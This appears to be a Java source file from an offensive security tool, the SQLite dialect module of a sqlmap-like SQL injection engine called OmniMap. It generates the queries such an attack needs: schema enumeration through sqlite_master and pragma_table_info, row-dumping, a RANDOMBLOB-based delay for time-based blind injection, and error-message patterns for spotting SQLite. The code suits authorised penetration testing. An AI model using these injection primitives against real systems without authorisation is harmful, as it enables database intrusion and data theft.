package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * SQLite dialect for OmniMap.
 * Uses sqlite_master, SUBSTR(), CHAR(), heavy-query delay (no native SLEEP),
 * CASE WHEN for conditionals. No error-based extraction available.
 */
public class SqliteDialect implements DbmsDialect {

    @Override
    public String getName() { return "SQLite"; }

    @Override
    public String currentDatabase() {
        // SQLite doesn't have a database() function; use a constant
        return "SELECT 'main'";
    }

    @Override
    public String listDatabases() {
        // SQLite only has one database per file
        return "SELECT 'main'";
    }

    @Override
    public String listTables(String database) {
        return "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT name FROM pragma_table_info('" + table + "')";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "IFNULL(CAST(\"" + c + "\" AS TEXT),CHAR(32))")
                .collect(Collectors.joining("||CHAR(124)||"));
        return "SELECT " + cols + " FROM \"" + table + "\" LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTR((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        // SQLite has no native sleep; use a heavy computation to simulate delay
        // This generates a cross-join that takes roughly `seconds` time
        return "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + (seconds * 100000000) + "/2))))";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // SQLite doesn't have useful error-based extraction functions
        return List.of();
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                Pattern.compile("SQLite3::query\\(\\):", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLITE_ERROR", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unrecognized token", Pattern.CASE_INSENSITIVE),
                Pattern.compile("near \".*\": syntax error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLite/JDBCDriver", Pattern.CASE_INSENSITIVE),
                Pattern.compile("System\\.Data\\.SQLite\\.SQLiteException", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + table + "\"";
    }
}
